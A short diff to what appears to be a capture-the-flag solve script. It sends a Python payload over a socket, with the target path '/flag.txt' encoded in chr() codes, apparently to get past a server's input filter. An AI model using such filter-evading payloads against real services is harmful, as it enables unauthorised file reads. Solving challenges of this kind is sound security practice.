@@ -15,7 +15,7 @@ with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
 
 	# Run your Python code and save the output to a variable
 	#payload = b"print(open('/flag.txt').read())"
-	payload = b"faesf"
+	payload = b"open(chr(47)+chr(102)+chr(108)+chr(97)+chr(103)+chr(46)+chr(116)+chr(120)+chr(116)).read()"
     
 	# Send the output to the server
 	s.sendall(payload)
